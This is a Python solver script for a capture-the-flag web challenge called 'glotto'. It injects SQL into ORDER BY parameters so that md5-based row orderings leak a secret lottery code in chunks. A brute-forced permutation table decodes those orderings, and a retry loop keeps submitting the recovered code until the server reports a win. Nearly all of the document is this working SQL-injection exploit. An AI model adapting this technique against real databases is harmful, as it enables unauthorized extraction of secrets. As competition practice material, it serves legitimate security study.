import hashlib
import itertools
import requests
import re
import math
import pickle
import os
import random


sess = requests.Session()

URL = 'http://glotto.web.ctfcompetition.com/'
param = {}
size = [4, 4, 3, 1]
start = 1

charset = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'

tables = [
    ['D5VBHEDB9YGF', 'UN683EI26G56', 'CA5G8VIB6UC9', '1WSNL48OLSAJ', 'I6I8UV5Q64L0', 'YYKCXJKAK3KV', '01VJNN9RHJAC', '00HE2T21U15H'],
    ['7AET1KPGKUG4', '4KYEC00RC5BZ', 'UDT5LEWRSWM9', '2JTBMJW9HZOO', 'OQQRH90KDJH1', 'BFWQCWYK9VHJ', '8DKYRPIO4QUW', '31OSKU57KV49', 'L4CY1JMRBEAW'],
    ['OWGVFW0XPLHE', 'ZJR7ANXVBLEF', 'PQ8ZW6TI1JH7', 'KRRNDWFFIB08', 'O3QZ2P6JNSSA', '8GAB09Z4Q88A', 'OMZRJWA7WWBC'],
    ['WXRJP8D4KKJQ', 'G0O9L3XPS3IR', '1JJL716ATSCZ', 'YELDF36F4TW7']
]


def cmpfunc(table, key):
    def cmp(i):
        s = table[i] + key
        s = hashlib.md5(s.encode()).hexdigest()
        return s
    return cmp
        

if os.path.exists('permutations.pkl'):
    with open('permutations.pkl', 'rb') as f:
        permutations = pickle.load(f)
else:
    permutations = [{}, {}, {}, {}]
    for permu, table, sz in zip(permutations, tables, size):
        for key in itertools.product(charset, repeat=sz):
            key = ''.join(key)
            res = sorted(range(len(table)), key=cmpfunc(table, key))
            res = tuple(res)
            permu[res] = key
        print('Found: ', len(permu), ', Expected: ', math.factorial(len(table)))

    with open('permutations.pkl', 'wb') as f:
        pickle.dump(permutations, f)

tables = [{e: i for i, e in enumerate(table)} for table in tables]

for i, sz in enumerate(size):
    o = 'length`(winner),md5(concat(winner,substr(@lotto,%s,%s))),`winner' % (start, sz)
    param['order%s' % i] = o
    start += sz

for i in range(100000):
    print('Try', i)
    timeout = random.random() * 0.5 + 1.7
    try:
        res = sess.get(URL, params=param, timeout=timeout)
        print(res)

        res = res.text
        matches = re.findall(r'<td>....-..-..</td><td>([0-9A-Z]+)</td>', res)

        key = ''
        for table, permu in zip(tables, permutations):
            sz = len(table)
            p = tuple(table[e] for e in matches[:sz])
            key += permu[p]
            matches = matches[sz:]
        print(key)

        res = sess.post(URL, data={'code': key}, timeout=timeout)
        print(res)
        print(res.text)
        if 'won' in res.text:
            break
    except (KeyError, requests.exceptions.Timeout):
        pass
